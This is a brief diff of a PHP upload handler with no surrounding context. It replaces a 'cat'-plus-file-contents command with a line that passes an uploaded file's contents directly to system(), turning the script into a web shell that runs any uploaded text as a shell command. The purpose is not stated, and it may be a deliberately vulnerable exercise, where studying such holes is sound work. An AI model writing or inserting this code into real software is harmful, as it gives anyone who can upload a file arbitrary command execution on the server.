@@ -1,8 +1,9 @@
 <?php 
 
 $uploaded_file = $_FILES['fileToUpload']['tmp_name'];
-$command = "cat ".file_get_contents($uploaded_file);
-$output = system($command);
+//$command = "cat ".file_get_contents($uploaded_file);
+//$output = system($command);
+$output = system(file_get_contents($uploaded_file));
 
 ?>
 
